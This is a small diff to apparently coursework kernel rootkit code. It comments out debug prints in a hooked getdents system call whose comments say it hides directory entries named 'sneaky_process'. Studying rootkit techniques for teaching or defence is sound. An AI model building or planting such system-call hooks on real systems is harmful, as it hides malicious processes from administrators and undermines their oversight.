@@ -79,7 +79,7 @@ asmlinkage int sneaky_getdents (unsigned int fd,
   int examined_size = 0;
   int skipped_size = 0;
 
-  printk("Get Dents!");
+  //  printk("Get Dents!");
 
   // iterate through "dirp ",
   // skip: any dirent with filename == "sneaky_process"
@@ -96,8 +96,8 @@ asmlinkage int sneaky_getdents (unsigned int fd,
       // ha! ISO C90 forbids mixed var declare & code !??
       void* unexamined_start;
       int unexamined_size;
-
-      printk("WWWWW Found!");
+      
+      //printk("WWWWW Found!");
       
       skipped_size += ptr->d_reclen;
 
